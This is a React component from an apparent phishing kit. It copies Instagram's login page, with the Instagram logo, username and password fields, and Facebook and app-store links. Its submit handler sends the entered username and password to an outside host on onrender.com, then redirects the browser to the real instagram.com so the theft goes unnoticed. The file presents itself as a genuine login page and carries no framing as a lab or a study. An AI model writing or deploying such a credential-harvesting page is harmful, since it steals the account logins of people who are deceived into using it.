// frontend/src/Login.js
import { useState } from "react";
import axios from "axios";
import { FaFacebook } from "react-icons/fa";
import InstagramLogo from "./InstagramLogo";
// import { Link } from "react-router-dom";
import play from "../assets/play.png";
import microsoft from "../assets/microsoft.png";
import { LuLoader } from "react-icons/lu";
// import Footer from "./Footer";
const Login = () => {
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    username: "",
    password: "",
  });

  const handleChange = (e) => {
    setError("");
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    try {
      await axios.post(
        // "http://localhost:5000/api/login",
        "https://instagrambackend-xgrd.onrender.com/api/login",
        formData
      );
      setLoading(false);
      window.location.href = "https://www.instagram.com";
    } catch (error) {
      console.log(error);
    }
  };

  return (
    <div>
      <div className="bg-black">
        <div className="w-full max-w-sm">
          <div className="bg-black border border-gray-300 p-6 rounded-lg shadow-md">
            <h2 className="text-center text-4xl font-bold mb-6 font-sans">
              {" "}
              <InstagramLogo />
            </h2>
            <form onSubmit={handleSubmit}>
              <input
                type="text"
                name="username"
                placeholder="Phone number, username, or email"
                value={formData.username}
                onChange={handleChange}
                className="w-full py-2 px-2 text-sm border bg-black text-gray-100 border-gray-300 rounded mb-2 focus:outline-none focus:ring-1 focus:ring-gray-400"
                required
              />
              <input
                type="password"
                name="password"
                placeholder="Password"
                value={formData.password}
                onChange={handleChange}
                className="w-full px-2 text-sm py-2 border text-gray-100 bg-black  border-gray-300 rounded mb-2 focus:outline-none focus:ring-1 focus:ring-gray-400"
                required
              />
              <button
                type="submit"
                className="w-full bg-blue-500 text-white p-2  rounded font-semibold hover:bg-blue-600 text-sm focus:bg-blue-500"
              >
                {loading ? (
                  <LuLoader className=" animate-spin mx-auto" />
                ) : (
                  "Log In"
                )}
              </button>
            </form>
            <div className="flex items-center justify-center gap-5">
              <div className="bg-gray-800 w-1/3 border  "></div>
              <p className="text-center my-4 text-gray-200 text-sm">OR</p>
              <div className="bg-gray-800 w-1/3 border  "></div>
            </div>
            <button className="w-full  text-blue-600 p-2 rounded font-semibold flex items-center justify-center gap-2 text-sm">
              <FaFacebook className="text-blue-500" />{" "}
              <a href={"http://www.facebook.com"}>Log in with Facebook</a>
            </button>
            {error && <p className="text-red-500 text-center my-2">{error}</p>}

            <p className="text-center text-white my-2 cursor-pointer hover:underline">
              Forgot password?
            </p>
          </div>
          <div className=" border text-white border-gray-300 p-4 text-center mt-4 rounded-lg shadow-md">
            Don't have an account?{" "}
            <span className=" cursor-pointer hover:underline text-blue-500 font-semibold text-sm">
              Sign up
            </span>
          </div>
          <section className="my-2">
            <p className="text-center mt-4 text-white text-sm">Get the app.</p>
            <div className="flex items-center justify-center gap-3 my-2">
              <a
                href={"https://www.google.com"}
                target={"_blank"}
                className="bg-gray"
              >
                <img src={play} alt={"google play"} className="w-32 h-34" />
              </a>
              <a
                href={"https://www.microsoft.com"}
                target={"_blank"}
                className="bg-gray"
              >
                <img src={microsoft} alt={"microsoft "} className="w-24 " />
              </a>
            </div>
          </section>
        </div>
      </div>
    </div>
  );
};

export default Login;
